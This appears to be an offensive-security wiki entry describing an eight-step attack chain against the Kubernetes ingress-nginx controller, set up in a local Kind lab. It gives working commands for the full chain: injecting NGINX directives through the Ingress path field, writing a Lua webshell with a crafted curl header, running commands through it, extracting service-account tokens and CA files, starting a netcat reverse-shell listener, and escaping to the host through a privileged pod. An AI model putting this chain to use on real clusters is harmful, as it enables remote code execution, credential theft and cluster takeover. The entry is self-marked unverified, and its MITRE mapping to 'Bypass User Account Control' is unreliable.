---
tags:
  - rce
  - kubernetes
  - ingress
  - nginx
  - lua
  - privilege-escalation
  - token-theft
type: attack_chain
tools:
  - '[[tools/kind]]'
  - '[[tools/kubectl]]'
  - '[[tools/curl]]'
  - '[[tools/nc]]'
tactics:
  - '[[Execution]]'
  - '[[Privilege Escalation]]'
  - '[[Collection]]'
verified: false
platforms:
  - Kubernetes
  - Linux
submitted: true
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Setup-Kind-Kubernetes-Cluster]]'
  - '[[procedures/Deploy-NGINX-Ingress-Controller]]'
  - '[[procedures/Create-Malicious-Ingress-for-File-Write]]'
  - '[[procedures/Inject-Lua-Code-via-HTTP-Request]]'
  - '[[procedures/Create-Webshell-Ingress-for-RCE]]'
  - '[[procedures/Execute-Arbitrary-Commands-via-Webshell]]'
  - '[[procedures/Extract-Service-Account-Tokens-and-Generate-Kubeconfig]]'
  - '[[procedures/Escape-to-Host-via-Privileged-Pod]]'
step_count: 8
techniques:
  - '[[Unix Shell]]'
  - '[[Credentials In Files]]'
  - '[[Bypass User Account Control]]'
updated_at: '2025-12-14T17:23:49.959Z'
description: >-
  Multi-stage attack exploiting insufficient sanitization in the Ingress
  spec.rules.http.paths.path field to inject NGINX directives, enabling
  arbitrary file writes, Lua code inclusion for RCE on the
  ingress-nginx-controller pod, token theft, and full cluster compromise via
  privilege escalation.
id: 3ba212a1-8164-4333-baf2-0369c64628b3
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Privilege Escalation]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[Unix Shell]]'
  - '[[Credentials In Files]]'
  - '[[Bypass User Account Control]]'
---
# Kubernetes Ingress NGINX RCE via Malicious Path Injection Leading to Cluster Compromise

Multi-stage attack chain demonstrating exploitation of the ingress-nginx-controller vulnerability (HackerOne #1620702) where insufficient sanitization of the Ingress spec.rules.http.paths.path field allows injection of arbitrary NGINX configuration snippets, such as log_format and access_log directives, to write Lua code to a file and include it for remote code execution (RCE). This leads to command execution on the pod, theft of service account tokens, generation of kubeconfigs for escalation, and eventual escape to the host node for full cluster compromise.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 8 |
| Execution Time | ~30 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Setup Environment] --> B[Deploy Components]
    B --> C[Inject Malicious Config]
    C --> D[Write and Include Lua]
    D --> E[Execute RCE]
    E --> F[Steal Tokens]
    F --> G[Escalate Privileges]
    G --> H[Escape to Host]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#f39c12
    style D fill:#f39c12
    style E fill:#3498db
    style F fill:#3498db
    style G fill:#3498db
    style H fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/kind]]
- [[tools/kubectl]]
- [[tools/curl]]
- [[tools/nc]]

### Target Environment

- Kubernetes cluster (tested with Kind local setup)
- NGINX Ingress Controller deployed
- Privileges to create/update Ingress resources
- Ports 80, 443 exposed; additional port 11337 for reverse shell
- Linux-based nodes

### Initial Access Requirements

- User with RBAC permissions to create Ingress resources
- Local access to run Kind and kubectl
- Network access to the cluster API and ingress endpoints

## Detailed Attack Procedures

### Step 1: Setup Local Kubernetes Cluster
procedure: [[procedures/Setup-Kind-Kubernetes-Cluster]]

**Objective**: Provision a local Kind cluster configured for ingress testing with exposed ports.

**Instructions**: Create a Kind cluster configuration file (lab.yaml) defining a control-plane node with label ingress-ready=true and extra port mappings for 80 and 443. Then use [[commands/kind-create-cluster-with-config]] to provision the cluster.

```bash
kind create cluster --config lab.yaml
```

**Expected Output**: Cluster creation logs ending with confirmation that the cluster is ready.

**Success Indicators**:
- Cluster nodes visible via `kubectl get nodes`
- Ports 80/443 mapped correctly

### Step 2: Deploy NGINX Ingress Controller
procedure: [[procedures/Deploy-NGINX-Ingress-Controller]]

**Objective**: Install the official NGINX Ingress Controller deployment for Kind.

**Instructions**: Apply the deployment YAML using [[commands/kubectl-apply-ingress-deployment]] to deploy the controller.

```bash
kubectl apply -f https://raw.githubusercontent.com/kubernetes/ingress-nginx/main/deploy/static/provider/kind/deploy.yaml
```

**Expected Output**: Deployment status messages confirming pods are running.

**Success Indicators**:
- Ingress controller pod in Running state: `kubectl get pods -n ingress-nginx`
- Services exposed on ports 80/443

### Step 3: Create Malicious Ingress for File Write
procedure: [[procedures/Create-Malicious-Ingress-for-File-Write]]

**Objective**: Inject NGINX config via the path field to enable arbitrary file writing using access_log.

**Instructions**: Prepare write_ingress.yaml with malicious path injection including log_format and access_log directives. Apply using [[commands/kubectl-apply-write-ingress-yaml]].

```bash
kubectl apply -f write_ingress.yaml
```

**Expected Output**: Ingress resource created successfully.

**Success Indicators**:
- Ingress applied without errors: `kubectl get ingress`
- NGINX config updated in the controller pod

### Step 4: Inject Lua Code via HTTP Request
procedure: [[procedures/Inject-Lua-Code-via-HTTP-Request]]

**Objective**: Trigger access_log to write Lua webshell code to /tmp/luashell using a crafted HTTP request.

**Instructions**: Send a curl request to /z/ with Host header x.x and x-ginoah header containing the Lua code for command execution using [[commands/curl-inject-lua-code]].

```bash
curl localhost/z/ -H "host: x.x" -H 'x-ginoah: content_by_lua_block {ngx.req.read_body();local post_args = ngx.req.get_post_args();local cmd = post_args["cmd"];if cmd then f_ret = io.popen(cmd);local ret = f_ret:read("*a");ngx.say(string.format("%s", ret));end;}'`
```

**Expected Output**: HTTP response (may be empty), but Lua file written to /tmp/luashell in the pod.

**Success Indicators**:
- Verify file existence by exec into pod: `kubectl exec -n ingress-nginx <pod> -- cat /tmp/luashell`
- File contains the injected Lua code

### Step 5: Create Webshell Ingress for RCE
procedure: [[procedures/Create-Webshell-Ingress-for-RCE]]

**Objective**: Update Ingress to include the Lua file via NGINX include directive, enabling RCE.

**Instructions**: Prepare webshell_ingress.yaml with include /tmp/luashell in the location block. Apply using [[commands/kubectl-apply-webshell-ingress-yaml]].

```bash
kubectl apply -f webshell_ingress.yaml
```

**Expected Output**: Ingress updated successfully.

**Success Indicators**:
- Ingress config reloaded in controller
- /z/ location now executes Lua

### Step 6: Execute Arbitrary Commands via Webshell
procedure: [[procedures/Execute-Arbitrary-Commands-via-Webshell]]

**Objective**: Demonstrate RCE by executing commands through the Lua webshell.

**Instructions**: POST to /z/ with cmd parameter using [[commands/curl-execute-webshell-command]].

```bash
curl localhost/z/ -H "host: x.x" -d "cmd=id"
```

**Expected Output**: Output of the command, e.g., "uid=2000(ingress-nginx) gid=2000(ingress-nginx) groups=2000(ingress-nginx)".

**Success Indicators**:
- Command output returned in HTTP response
- Ability to run any shell command

### Step 7: Extract Service Account Tokens and Generate Kubeconfig
procedure: [[procedures/Extract-Service-Account-Tokens-and-Generate-Kubeconfig]]

**Objective**: Use RCE to steal SA tokens, CA, and namespace, then generate kubeconfig for the ingress SA and escalate to other SAs.

**Instructions**: Use curl with cmd to base64 CA, cat token/namespace via [[commands/curl-extract-ingress-sa-creds]]. Then generate ingress.kubeconfig. Dump all SA tokens using [[commands/kubectl-dump-all-sa-tokens]]. Create sa.kubeconfig for privileged SA like statefulset-controller using [[commands/bash-generate-sa-kubeconfig]].

```bash
# Example for extracting (full script in procedure)
curl -s -H "host: x.x" localhost/z/ -d "cmd=base64 /var/run/secrets/kubernetes.io/serviceaccount/ca.crt -w 0"
```

**Expected Output**: Kubeconfig files created; list of namespace/token pairs.

**Success Indicators**:
- Kubeconfig validates: `kubectl --kubeconfig ingress.kubeconfig get nodes`
- Tokens decoded and usable

### Step 8: Escape to Host via Privileged Pod
procedure: [[procedures/Escape-to-Host-via-Privileged-Pod]]

**Objective**: Use escalated SA to deploy a privileged pod for host escape, then chroot and inspect PKI.

**Instructions**: Start nc listener with [[commands/nc-listen-for-reverse-shell]]. Apply escape_pod.yaml using [[commands/kubectl-apply-escape-pod]] with sa.kubeconfig. Exec into pod, chroot /chroot using [[commands/chroot-to-host-root]], and list PKI with [[commands/ls-kubernetes-pki]].

```bash
nc -kl 0.0.0.0 11337
kubectl --kubeconfig sa.kubeconfig apply -f escape_pod.yaml
```

**Expected Output**: Reverse shell connection; host shell prompt; list of cert/key files.

**Success Indicators**:
- Shell on host: able to run `ls /etc/kubernetes/pki/`
- Access to cluster admin privileges

## Attack Chain Summary

### Key Achievements

1. Achieved RCE on ingress-nginx-controller pod via NGINX config injection.
2. Stolen service account tokens across namespaces for lateral movement.
3. Escalated to privileged SAs and escaped container to host node.
4. Full cluster compromise potential via PKI access.

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Unix Shell]] Unix Shell
- [[Credentials In Files]] Credentials In Files
- [[Bypass User Account Control]] Bypass User Account Control

### MITRE ATT&CK Tactics

- [[Execution]] Execution
- [[Privilege Escalation]] Privilege Escalation
- [[Collection]] Collection

---

*Last updated: 2023-10-01T00:00:00Z*
